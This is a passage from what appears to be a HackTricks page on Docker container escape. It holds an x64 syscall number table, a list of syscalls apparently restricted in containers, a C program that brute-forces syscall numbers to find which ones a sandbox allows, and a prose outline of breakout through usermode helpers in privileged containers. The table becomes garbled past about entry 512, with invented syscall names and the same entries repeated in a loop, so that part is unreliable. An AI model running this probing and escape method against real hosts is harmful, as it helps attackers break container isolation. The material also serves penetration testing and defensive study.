| 215 | epoll_wait_old |
| 216 | remap_file_pages |
| 217 | getdents64 |
| 218 | set_tid_address |
| 219 | restart_syscall |
| 220 | semtimedop |
| 221 | fadvise64 |
| 222 | timer_create |
| 223 | timer_settime |
| 224 | timer_gettime |
| 225 | timer_getoverrun |
| 226 | timer_delete |
| 227 | clock_settime |
| 228 | clock_gettime |
| 229 | clock_getres |
| 230 | clock_nanosleep |
| 231 | exit_group |
| 232 | epoll_wait |
| 233 | epoll_ctl |
| 234 | tgkill |
| 235 | utimes |
| 236 | vserver |
| 237 | mbind |
| 238 | set_mempolicy |
| 239 | get_mempolicy |
| 240 | mq_open |
| 241 | mq_unlink |
| 242 | mq_timedsend |
| 243 | mq_timedreceive |
| 244 | mq_notify |
| 245 | mq_getsetattr |
| 246 | kexec_load |
| 247 | waitid |
| 248 | add_key |
| 249 | request_key |
| 250 | keyctl |
| 251 | ioprio_set |
| 252 | ioprio_get |
| 253 | inotify_init |
| 254 | inotify_add_watch |
| 255 | inotify_rm_watch |
| 256 | migrate_pages |
| 257 | openat |
| 258 | mkdirat |
| 259 | mknodat |
| 260 | fchownat |
| 261 | futimesat |
| 262 | newfstatat |
| 263 | unlinkat |
| 264 | renameat |
| 265 | linkat |
| 266 | symlinkat |
| 267 | readlinkat |
| 268 | fchmodat |
| 269 | faccessat |
| 270 | pselect6 |
| 271 | ppoll |
| 272 | unshare |
| 273 | set_robust_list |
| 274 | get_robust_list |
| 275 | splice |
| 276 | tee |
| 277 | sync_file_range |
| 278 | vmsplice |
| 279 | move_pages |
| 280 | utimensat |
| 281 | epoll_pwait |
| 282 | signalfd |
| 283 | timerfd_create |
| 284 | eventfd |
| 285 | fallocate |
| 286 | timerfd_settime |
| 287 | timerfd_gettime |
| 288 | accept4 |
| 289 | signalfd4 |
| 290 | eventfd2 |
| 291 | epoll_create1 |
| 292 | dup3 |
| 293 | pipe2 |
| 294 | inotify_init1 |
| 295 | preadv |
| 296 | pwritev |
| 297 | rt_tgsigqueueinfo |
| 298 | perf_event_open |
| 299 | recvmmsg |
| 300 | fanotify_init |
| 301 | fanotify_mark |
| 302 | prlimit64 |
| 303 | name_to_handle_at |
| 304 | open_by_handle_at |
| 305 | clock_adjtime |
| 306 | syncfs |
| 307 | sendmmsg |
| 308 | setns |
| 309 | getcpu |
| 310 | process_vm_readv |
| 311 | process_vm_writev |
| 312 | kcmp |
| 313 | finit_module |
| 314 | sched_setattr |
| 315 | sched_getattr |
| 316 | renameat2 |
| 317 | seccomp |
| 318 | getrandom |
| 319 | memfd_create |
| 320 | kexec_file_load |
| 321 | bpf |
| 322 | execveat |
| 323 | userfaultfd |
| 324 | membarrier |
| 325 | mlock2 |
| 326 | copy_file_range |
| 327 | preadv2 |
| 328 | pwritev2 |
| 329 | pkey_mprotect |
| 330 | pkey_alloc |
| 331 | pkey_free |
| 332 | statx |
| 333 | io_pgetevents |
| 334 | rseq |
| 424 | pidfd_send_signal |
| 425 | io_uring_setup |
| 426 | io_uring_enter |
| 427 | io_uring_register |
| 428 | open_tree |
| 429 | move_mount |
| 430 | fsopen |
| 431 | fsconfig |
| 432 | fsmount |
| 433 | fspick |
| 434 | pidfd_open |
| 435 | clone3 |
| 436 | close_range |
| 437 | openat2 |
| 438 | pidfd_getfd |
| 439 | faccessat2 |
| 440 | process_madvise |
| 512 | rt_sigaction |
| 513 | rt_sigreturn |
| 514 | ioctl |
| 515 | readv |
| 516 | writev |
| 517 | recvfrom |
| 518 | sendmsg |
| 519 | recvmsg |
| 520 | execveat |
| 521 | membarrier |
| 522 | userfaultfd |
| 523 | copy_file_range |
| 524 | preadv2 |
| 525 | pwritev2 |
| 526 | pkey_mprotect |
| 527 | pkey_alloc |
| 528 | pkey_free |
| 529 | statx |
| 530 | rseq |
| 531 | io_pgetevents |
| 532 | semtimedop |
| 533 | semget |
| 534 | semctl |
| 535 | shmget |
| 536 | shmctl |
| 537 | shmat |
| 538 | shmdt |
| 539 | msgget |
| 540 | msgsnd |
| 541 | msgrcv |
| 542 | msgctl |
| 543 | clock_gettime |
| 544 | clock_settime |
| 545 | clock_adjtime |
| 546 | clock_getres |
| 547 | clock_nanosleep |
| 548 | timer_gettime |
| 549 | timer_settime |
| 550 | timerfd_gettime |
| 551 | timerfd_settime |
| 552 | utimensat |
| 553 | pselect6 |
| 554 | ppoll |
| 555 | io_pgetevents_time64 |
| 556 | recvmmsg_time64 |
| 557 | mq_timedsend_time64 |
| 558 | mq_timedreceive_time64 |
| 559 | semtimedop_time64 |
| 560 | rt_sigtimedwait_time64 |
| 561 | futex_time64 |
| 562 | sched_rr_get_interval_time64 |
| 563 | pidfd_send_signal |
| 564 | io_uring_enter |
| 565 | io_uring_register |
| 566 | open_tree |
| 567 | move_mount |
| 568 | fsopen |
| 569 | fsconfig |
| 570 | fsmount |
| 571 | fspick |
| 572 | pidfd_open |
| 573 | clone3 |
| 574 | close_range |
| 575 | openat2 |
| 576 | pidfd_getfd |
| 577 | faccessat2 |
| 578 | process_madvise |
| 579 | epoll_pwait2 |
| 580 | mount_setattr |
| 581 | quotactl_fd |
| 582 | landlock_create_ruleset |
| 583 | landlock_add_rule |
| 584 | landlock_restrict_self |
| 585 | memfd_secret |
| 586 | process_mrelease |
| 587 | pwritevf |
| 588 | preadvf |
| 589 | fallocate |
| 590 | copy_file_range |
| 591 | copy_file_range2 |
| 592 | copy_file_range4 |
| 593 | futex_time64 |
| 594 | sched_rr_get_interval_time64 |
| 595 | io_pgetevents_time64 |
| 596 | recvmmsg_time64 |
| 597 | mq_timedsend_time64 |
| 598 | mq_timedreceive_time64 |
| 599 | semtimedop_time64 |
| 600 | rt_sigtimedwait_time64 |
| 601 | futex_time64 |
| 602 | sched_rr_get_interval_time64 |
| 603 | io_pgetevents_time64 |
| 604 | recvmmsg_time64 |
| 605 | mq_timedsend_time64 |
| 606 | mq_timedreceive_time64 |
| 607 | semtimedop_time64 |
| 608 | rt_sigtimedwait_time64 |
| 609 | futex_time64 |
| 610 | sched_rr_get_interval_time64 |
| 611 | io_pgetevents_time64 |
| 612 | recvmmsg_time64 |
| 613 | mq_timedsend_time64 |
| 614 | mq_timedreceive_time64 |
| 615 | semtimedop_time64 |
| 616 | rt_sigtimedwait_time64 |
| 617 | futex_time64 |
| 618 | sched_rr_get_interval_time64 |
| 619 | io_pgetevents_time64 |
| 620 | recvmmsg_time64 |
| 621 | mq_timedsend_time64 |
| 622 | mq_timedreceive_time64 |
| 623 | semtimedop_time64 |
| 624 | rt_sigtimedwait_time64 |
| 625 | futex_time64 |
| 626 | sched_rr_get_interval_time64 |
| 627 | io_pgetevents_time64 |
| 628 | recvmmsg_time64 |
| 629 | mq_timedsend_time64 |
| 630 | mq_timedreceive_time64 |
| 631 | semtimedop_time64 |
| 632 | rt_sigtimedwait_time64 |
| 633 | futex_time64 |
| 634 | sched_rr_get_interval_time64 |
| 635 | io_pgetevents_time64 |
| 636 | recvmmsg_time64 |
| 637 | mq_timedsend_time64 |
| 638 | mq_timedreceive_time64 |
| 639 | semtimedop_time64 |
| 640 | rt_sigtimedwait_time64 |
| 641 | futex_time64 |
| 642 | sched_rr_get_interval_time64
```
0x029 -- pivot_root
0x059 -- acct
0x069 -- init_module
0x06a -- delete_module
0x074 -- syslog
0x09d -- setsid
0x0a1 -- sethostname
0x0a2 -- setdomainname
0x0aa -- settimeofday
0x0e0 -- swapon
0x0e1 -- swapoff
0x106 -- fanotify_init
0x109 -- open_by_handle_at
0x111 -- finit_module
0x118 -- bpf
```
{% tab title="syscall_bf.c" %}
````c
// From a conversation I had with @arget131
// Fir bfing syscalss in x64

#include <sys/syscall.h>
#include <unistd.h>
#include <stdio.h>
#include <errno.h>

int main()
{
for(int i = 0; i < 333; ++i)
{
if(i == SYS_rt_sigreturn) continue;
if(i == SYS_select) continue;
if(i == SYS_pause) continue;
if(i == SYS_exit_group) continue;
if(i == SYS_exit) continue;
if(i == SYS_clone) continue;
if(i == SYS_fork) continue;
if(i == SYS_vfork) continue;
if(i == SYS_pselect6) continue;
if(i == SYS_ppoll) continue;
if(i == SYS_seccomp) continue;
if(i == SYS_vhangup) continue;
if(i == SYS_reboot) continue;
if(i == SYS_shutdown) continue;
if(i == SYS_msgrcv) continue;
printf("Probando: 0x%03x . . . ", i); fflush(stdout);
if((syscall(i, NULL, NULL, NULL, NULL, NULL, NULL) < 0) && (errno == EPERM))
printf("Error\n");
else
printf("OK\n");
}
}
```

````
{% endtab %}
{% endtabs %}

### Container Breakout through Usermode helper Template

If you are in **userspace** (**no kernel exploit** involved) the way to find new escapes mainly involve the following actions (these templates usually require a container in privileged mode):

* Find the **path of the containers filesystem** inside the host
* You can do this via **mount**, or via **brute-force PIDs** as explained in the second release\_agent exploit
* Find some functionality where you can **indicate the path of a script to be executed by a host process (helper)** if something happens
* You should be able to **execute the trigger from inside the host**
* You need to know where the containers files are located inside the host to indicate a script you write inside the host
* Have **enough capabilities and disabled protections** to be able to abuse that functionality
* You might need to **mount things** o perform **special privileged actions** you cannot do in a default docker container

## References

* [https://twitter.com/\_fel1x/status/1151487053370187776?lang=en-GB](https://twitter.com/\_fel1x/status/1151487053370187776?lang=en-GB)
* [https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)
* [https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html](https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html)
* [https://medium.com/swlh/kubernetes-attack-path-part-2-post-initial-access-1e27aabda36d](https://medium.com/swlh/kubernetes-attack-path-part-2-post-initial-access-1e27aabda36d)
* [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/host-networking-driver](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/host-networking-driver)
* [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/exposed-docker-socket](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/exposed-docker-socket)
* [https://bishopfox.com/blog/kubernetes-pod-privilege-escalation#Pod4](https://bishopfox.com/blog/kubernetes-pod-privilege-escalation#Pod4)



<figure><img src="/.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

Use [**Trickest**](https://trickest.io/) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
Get Access Today:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>
